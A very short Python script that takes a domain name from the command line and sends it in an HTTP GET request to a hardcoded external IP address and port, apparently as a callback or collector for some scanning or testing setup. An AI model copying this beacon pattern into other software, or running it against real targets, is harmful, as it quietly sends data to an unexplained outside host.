import sys
import requests

domain = 'http://' + sys.argv[1]
requests.get("http://43.133.9.189:32123/?"+domain)
